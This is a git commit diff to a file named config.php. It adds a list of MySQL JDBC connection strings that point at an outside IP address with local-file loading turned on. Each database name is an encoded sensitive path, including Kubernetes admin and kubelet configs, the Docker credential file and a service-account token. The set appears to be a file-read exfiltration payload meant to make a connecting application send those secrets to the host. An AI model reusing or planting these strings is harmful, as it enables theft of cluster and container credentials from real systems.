e4b8772cadce728b79a3241b57330c58ee52f24b
Shubs <infosec-au@users.noreply.github.com>
2024-02-23 15:15:12 +0800

    Update config.php

--- config.php
+++ config.php
@@ -3,4 +3,13 @@ microsoft.com
 google.com
 linkedin.com
 
-my jdbc is jdbc:mysql://root:root@tcp(51.159.31.124:3306)/mydb?allowAllFiles=true&t=1
+my jdbc is jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fhosts?allowAllFiles=true&t=1
+
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fkubelet.conf?allowLoadLocalInfile=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fbootstrap-kubelet.conf?allowLoadLocalInfile=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fbootstrap-kubelet.conf?allowLoadLocalInfile=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fdocker%2fdaemon.json?allowLoadLocalInfile=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2froot%2f.docker%2fconfig.json?allowLoadLocalInfile=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fvar%2frun%2fsecrets%2fkubernetes.io%2fserviceaccount%2ftoken?allowLoadLocalInfile=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fadmin.conf?allowLoadLocalInfile=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fkubeconfig?allowLoadLocalInfile=true&t=1
